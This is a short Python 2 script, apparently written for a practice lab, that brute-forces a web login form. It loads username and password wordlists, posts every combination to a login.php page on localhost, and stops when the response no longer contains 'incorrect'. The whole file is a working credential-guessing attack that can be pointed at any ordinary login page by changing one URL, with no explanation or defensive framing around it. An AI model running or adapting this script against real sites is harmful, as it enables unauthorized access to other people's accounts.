# By ihebski
import requests
import sys

url = "http://localhost/bruteforce/login.php"
expression = "incorrect"


def brute(username,password):
	data = {'username':username,'password':password}
	r = requests.post(url,data=data)
	if expression not in r.content :
		print "[+] Correct password Found: ",password
		sys.exit()
	else:
		print r.content," ",password




def main():
        usernames=[w.strip() for w in open("usernames.txt", "rb").readlines()]
	words = [w.strip() for w in open("passwords.txt", "rb").readlines()] #parse wordlist
	for user in usernames:
                for payload in words:
                        brute(user,payload)


if __name__ == '__main__':
	main()
